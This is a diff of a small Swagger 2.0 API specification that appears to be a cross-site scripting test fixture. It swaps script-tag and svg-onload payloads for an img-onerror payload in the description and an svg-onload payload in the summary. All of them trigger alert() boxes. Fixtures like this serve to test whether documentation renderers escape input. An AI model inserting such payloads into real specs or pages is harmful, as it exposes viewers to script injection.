@@ -1,12 +1,12 @@
 swagger: "2.0"
 info:
-  title: "XSS PoC"
-  description: "<script>alert('XSS')</script>"
+  title: "XSS Test"
+  description: "<img src=x onerror=alert('XSS-from-description')>"
+  version: "1.0.0"
 paths:
   /test:
     get:
-      summary: "Test"
-      description: "<svg onload=alert('XSS')>"
+      summary: "<svg/onload=alert('XSS-in-summary')>"
       responses:
         '200':
-          description: "Success"
+          description: "OK"
